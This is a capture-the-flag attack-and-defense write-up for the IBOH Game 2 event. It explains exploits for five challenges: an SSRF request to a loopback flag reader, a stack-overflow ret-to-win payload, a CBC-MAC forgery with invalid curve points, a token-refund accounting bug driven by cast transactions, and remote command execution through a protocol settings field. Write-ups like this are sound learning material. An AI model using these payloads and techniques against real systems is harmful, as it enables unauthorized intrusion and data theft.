# IBOH Game 2 A&D — Challenge exploitation write-up

This write-up documents the techniques used in the authorized IBOH Game 2 Attack & Defense event. It contains no API token, private key, or captured flag values. Use the procedures only against opponent targets returned by the game Targets API.

## Challenges covered

| Challenge | Category | Main technique |
|---|---|---|
| Rusty Day | Web | SSRF to a loopback-only flag reader |
| SupportConsole | Pwn | Stack overwrite and ret-to-win |
| ok, noted. | Crypto | CBC-MAC length extension and degenerate-point validation |
| On the House | Blockchain | Exchange/reserve accounting mismatch |
| reverse-my-connection | Reverse | MAC oracle and framed control protocol |

## Common workflow

1. Fetch the current opponent list. It excludes your own team and includes the round and health state.

    curl -sS https://warzone.battleofhackers.com/api/Game/2/Ad/Targets \
      -H "Authorization: Bearer $AD_API_TOKEN"

2. Use only teams whose lastCheckStatus is Ok. Refresh the list each round. Run private-network exploits from a host with the event WireGuard route or an authorized challenge shell that can reach the target subnet.

3. Capture flags from the challenge-specific response. Do not cache a flag across rounds.

4. Store one to 100 captured flags, one per line in a mode-600 file. Submit them without putting the token in a script:

    # AD_API_TOKEN must already be set from a secure secret store.
    python3 submit_flags.py /path/to/captured-flags.txt

The helper deduplicates input while preserving order. It prints the API statuses, not flag values. Accepted means the API recorded evidence; it does not by itself assign immediate points.

## Web — Rusty Day

### Root cause

The preview endpoint fetched a caller-supplied URL. The fetched page could call the local-only reader at /internal/read?path=/flag; the preview response then returned that internal response. This is an SSRF-to-local-file-read chain.

### Reproduction

For one in-scope target:

    python3 web_rusty_day.py TARGET_IP --port 8080

Equivalent request:

    curl -sS -G "http://TARGET_IP:8080/api/preview" \
      --data-urlencode 'url=http://127.0.0.1:8080/internal/read?path=/flag'

URL encoding matters because the destination URL contains its own query string. The script extracts a flag token from the preview body. It does not submit it; use submit_flags.py.

### Why it worked

The server made the request from inside the target container, where 127.0.0.1:8080 reached its own service. The internal reader exposed the current flag file. The exploit read it on each request, so it continued working after round rotation.

Saved PoC: web_rusty_day.py.

## Pwn — SupportConsole

### Root cause

The ticket-reference input overflowed a stack buffer. The saved return address was 88 bytes after the input start. The supplied challenge binary had fixed addresses for a ret gadget and a flag-dump routine, allowing a small ret-to-win chain without a libc leak.

### Reproduction

    python3 pwn_supportconsole.py TARGET_IP --port 9090

The script connects, selects menu option 1, waits for the ticket-reference prompt, and sends:

    b"A" * 88 + p64(0x401ed0) + p64(0x402380) + b"\n"

The first address is the ret alignment gadget; the second is the challenge's flag-dump function. The script reads the FLAG field from the response. These addresses and the offset are specific to the supplied SupportConsole binary.

Saved PoC: pwn_supportconsole.py. The broader historical runner is ../exploit_supportconsole.py; the single-target script is easier to review because it does not enumerate the roster or submit flags.

## Crypto — ok, noted.

### Root cause

The legacy notary used CBC-MAC without adequate length or domain binding. Chosen-message tags exposed a length-extension forgery, which yielded a notary token.

The cosign protocol also accepted degenerate elliptic-curve inputs. Its equality check compared only the x-coordinate of a point difference and did not correctly reject the crafted invalid/off-curve points. The PoC used x=0 points to make the broken comparison pass, supplied zero shares, and drove the signing flow until the service emitted the flag.

### Reproduction

    python3 crypto_ok_noted.py TARGET_IP --port 20561

The saved implementation:
1. Opens the legacy service and requests tags for a 16-byte block and its 15-byte prefix.
2. Uses the CBC-MAC length-extension relation to forge a notary token.
3. Opens cosign, parses the context and eight participants’ polynomial commitments, and constructs degenerate x=0 proof inputs.
4. Supplies zero shares and a crafted public verification share.
5. Reads signing rounds until a flag response appears.

The pure-Python Jacobian arithmetic mirrors the supplied py_ecc behavior, including its behavior on the malformed points used by the challenge. Ordinary curve arithmetic may reject or normalize those inputs and fail to reproduce the bug.

Saved PoC: crypto_ok_noted.py. It captures one target at a time and does not submit flags.

## Blockchain — On the House

### Root cause

The Exchange/Reserve accounting path accepted a request for 600 tokens, filled at most 500, but left the order’s spent value at zero. Cancelling then refunded the full 600 while Reserve evidence still recorded the 500-token loss. The platform claim helper converted that state into the target’s current flag.

### Reproduction sequence

Run inside your own On the House challenge container, where the challenge-provided wallet and house.sh helper are available. Do not copy the private key out of that container.

    TARGET_IP=10.13.40.x
    SERVICE="http://$TARGET_IP:8080"
    RPC_URL="$SERVICE/rpc"
    export RPC_URL SERVICE

1. Request the per-round faucet allocation:

    ./tools/house.sh faucet

2. Read the target’s contract registry and note the returned usd, reserve, and exchange addresses:

    INFO=$(curl -fsS "$SERVICE/self-info")
    USD=$(printf '%s' "$INFO" | jq -r .usd)
    RESERVE=$(printf '%s' "$INFO" | jq -r .reserve)
    EXCHANGE=$(printf '%s' "$INFO" | jq -r .exchange)
    PLAYER_KEY=$(cat /data/private/PRIVKEY)
    PLAYER=$(cast wallet address --private-key "$PLAYER_KEY")

3. Use the challenge wallet to approve 600e18 units to Reserve, then open an order for 600e18 with zero minimum fill. The ABI calls used were:

    cast send "$USD" 'approve(address,uint256)' "$RESERVE" 600000000000000000000 \
      --rpc-url "$RPC_URL" --private-key "$PLAYER_KEY"

    cast send "$EXCHANGE" 'open(uint256,uint256,address)' \
      600000000000000000000 0 "$PLAYER" \
      --rpc-url "$RPC_URL" --private-key "$PLAYER_KEY"

4. Read the just-created order id from Reserve nextOrder and cancel that order:

    ORDER_ID=$(cast call "$RESERVE" 'nextOrder()(uint256)' --rpc-url "$RPC_URL")
    cast send "$EXCHANGE" 'cancel(uint256)' "$ORDER_ID" \
      --rpc-url "$RPC_URL" --private-key "$PLAYER_KEY"

5. Claim the proof with the supplied helper:

    ./tools/house.sh claim

The helper signs the claim for the player and submits proof to the target service. Submit the resulting opponent flag with submit_flags.py.

The original container-specific wrapper and exact self-info JSON were not preserved locally. This sequence records the transaction flow from prior notes; confirm field names and helper behavior against the challenge image.

## Reverse — reverse-my-connection

### Root cause and protocol

The TCP service used frames with a one-byte opcode and a two-byte little-endian payload length. It authenticated a MAC over a 16-byte server nonce. After authentication, the service exposed PID identification and nine settings. The session_command setting could be changed; opcode 6 launched it. The successful PoC temporarily changed that command to read the current RSCTF_FLAG_FILE, captured one flag, restored the original setting, and verified all settings.

### Reproduction

1. Use the supplied sphostd binary and local helper to calculate a MAC for a nonce:

    python3 reverse_mac_oracle.py NONCE_HEX --binary /path/to/sphostd

2. From an authorized challenge shell with a route to the target, run:

    python3 reverse_remote_driver.py --host TARGET_IP --port 7777 \
      --out /tmp/captured.flag --execute

3. Each time the driver prints MAC_FOR, calculate that nonce’s MAC with step 1 and paste the 32-hex-character result at the driver prompt. The normal flow needs one MAC for initial authentication and one for fresh settings verification. If same-connection restoration fails, the driver can need an additional fresh-auth MAC.

4. The driver identifies a service PID, reads and preserves all nine settings, changes only session_command, invokes opcode 6 once, and saves a matched flag to the output file with mode 600. It restores the exact original command and verifies all settings before reporting success. If restoration is not verified, stop and inspect the target.

5. Transfer the saved flag securely to the machine running submit_flags.py. Do not paste the flag into logs or this write-up.

The local reverse_mac_oracle.py computes the challenge MAC through GDB and the supplied binary. The network driver is reconstructed from the successful session; it needs a live challenge shell, the binary, GDB on the machine running the MAC helper, and an interactive SSH PTY. Some peers were confirmed capturable; other reachable peers did not identify a usable PID.

## Files

- web_rusty_day.py — single-target SSRF PoC.
- pwn_supportconsole.py — single-target ret-to-win PoC.
- crypto_ok_noted.py — CBC-MAC length-extension and degenerate-point PoC.
- reverse_mac_oracle.py — local sphostd MAC helper.
- reverse_remote_driver.py — reconstructed framed-protocol driver with restoration checks.
- submit_flags.py — token-from-environment batch-submit helper.

No API token, private key, or flag value is stored in these files.
